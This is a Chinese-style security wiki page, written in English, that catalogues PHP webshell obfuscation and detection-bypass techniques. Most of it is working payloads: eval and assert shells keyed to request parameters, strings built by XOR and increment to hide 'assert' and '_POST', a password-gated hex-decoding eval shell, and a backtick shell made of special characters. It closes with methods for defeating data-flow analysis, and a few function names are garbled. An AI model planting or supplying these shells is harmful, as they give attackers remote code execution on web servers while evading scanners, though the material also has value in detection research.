WebShell
================================

Common deformations
--------------------------------
- GLOBALS
    - ``eval($GLOBALS['_POST']['op']);``
- ``$_FILE``
    - ``eval($_FILE['name']);``
- Split
    - ``eval(${"_PO"."ST"} ['sz']);``
- Dynamic function execution
    - ``$k="ass"."ert"; $k(${"_PO"."ST"} ['sz']);``
    - ``$a=$_GET['a'];$a($_GET['b']);``
- create_function
    - ``$function = create_function('$code',strrev('lave').'('.strrev('TEG_$').'["code"]);');$function();``
- preg_replace
- Transformation
    - str_replace(" ", "e v a l")
- Base conversion
    - ``"\x62\x61\163\x65\x36\x34\137\144\145\x63\x6f\144\145"``
- Base arithmetic
    - ``("#"^"|").("."^"~").("/"^"`").("|"^"/").("{"^"/");``
- Increment operation
    - ``$a="a";$a++;``
- Forced type conversion
    - ``$a='';$a.=[]; // Array``
- Utilize file names
    - ``__FILE__``
- Comments
    - ``$a="e"."v"./*-/*-*/"a"./*-*/"l";``
- reflection
    - ``ReflectionFunction``

Bypass
--------------------------------
- Based on rare functions
    - ``mb_eregi_replace('.*',$_GET[1],'','e');``
    - set_error_handler + trigger_error
- Spread based on contamination
    - ``putenv($_GET["c"]);eval(getenv('path'));``
    - parse_str
    - parse_url
    - extract
    - token_get_all
    - define
- Based on rare sources
    - ``$a = filter_input(INPUT_GET,'c');``
    - ``eval(end(getallheaders()));``
    - get_defined_vars
    - getallheaders
    - get_meta_tags
    - phpinfo
    - External variables/file information
    - Overload toString

String transformation function
--------------------------------
- base64_decode
- base64_encode
- str_replace
- str_rot13
- strtok
- strtolower
- strtoupper
- strtr
- substr
- substr_replace
- trim
- ucfirst
- ucwords

callback function
--------------------------------
- array_filter
- array_map
- array_reduce
- array_walk
- array_walk
- array_walk_recursive
- call_user_func
- call_user_func_array
- filter_var
- filter_var_array
- preg_replace_callback
- register_tick_function
- registregister_shutdown_function
- uasort
- uksort

Encryption and decryption functions
--------------------------------
- mcrypt_encrypt
- openssl_encrypt

Other execution methods
--------------------------------
- FFI
- SimpleXML
- SimpleXMLElement

Custom function
--------------------------------
Using custom encryption and decryption functions can bypass some protection software to a certain extent. The following code is a simple example of hexadecimal-based execution.

.. code:: php

    $string = '';
    $password = 'password';
    if(isset($_POST[$password])){
        $hex = $_POST[$password];
        for($i = 0; $i < strlen($hex) - 1; $i += 2) {
            $string .= chr(hexdec($hex[$i] . $hex[$i + 1]));
        }
    }
    eval($string);

Special characters Shell
--------------------------------
PHP strings can be directly operated when performing XOR and auto-increment operations, so special characters can be used to form a Shell.

.. code:: php

    <?=`{${~"\xa0\xb8\xba\xab"}[~"\xa0"]}`;

.. code:: php

    @$_++;
    $__=("#"^"|").("."^"~").("/"^"`").("|"^"/").("{"^"/");
    @${$__}[!$_](${$__}[$_]);


.. code:: php

    $_=[];
    $_=@"$_"; // $_='Array';
    $_=$_['!'=='@']; // $_=$_[0];
    $___=$_; // A
    $__=$_;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
    $___.=$__; // S
    $___.=$__; // S
    $__=$_;
    $__++;$__++;$__++;$__++; // E 
    $___.=$__;
    $__=$_;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
    $___.=$__;
    $__=$_;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
    $___.=$__;
    $____='_';
    $__=$_;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
    $____.=$__;
    $__=$_;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
    $____.=$__;
    $__=$_;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
    $____.=$__;
    $__=$_;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
    $____.=$__;

    $_=$$____;
    $___(base64_decode($_[_]));

detection confrontation
--------------------------------
- Program analysis based on confusion impact
- Influence program execution based on dynamic variables
- Throw exceptions to interrupt data flow analysis
- Interrupt data flow analysis based on reflection
- Interrupt data flow analysis based on reference passing
